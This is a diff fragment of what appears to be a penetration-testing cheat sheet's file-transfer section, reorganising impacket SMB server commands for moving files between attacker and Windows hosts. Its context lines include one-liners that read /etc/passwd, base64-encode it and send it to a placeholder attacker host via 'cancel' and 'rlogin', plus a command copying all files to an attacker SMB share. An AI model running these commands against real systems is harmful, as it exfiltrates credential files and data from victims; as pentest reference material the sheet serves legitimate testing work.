@@ -685,18 +685,6 @@ $ cancel -u "$(cat /etc/passwd | base64)" -h <LHOST>:<LPORT>
 $ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
 ```
 
-### SMB Access via PowerShell
-
-```c
-$ sudo python3 impacket/examples/smbserver.py <SHARE> ./
-```
-
-or
-
-```c
-$ sudo impacket-smbserver <SHARE> . -smb2support
-```
-
 ### Linux to Windows
 
 ```c
@@ -706,7 +694,21 @@ PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<L
 ### Windows to Linux
 
 ```c
+$ impacket-smbserver <SHARE> . -smb2support
+```
+
+```c
 C:\> copy * \\<LHOST>\<SHARE>
+```
+
+#### Authenticated
+
+```c
+$ impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
+```
+
+```c
+C:\> net use n: \\<LHOST>\share /user:<USERNAME> <PASSWORD>
 ```
 
 ### Windows to Linux using Invoke-Webrequest
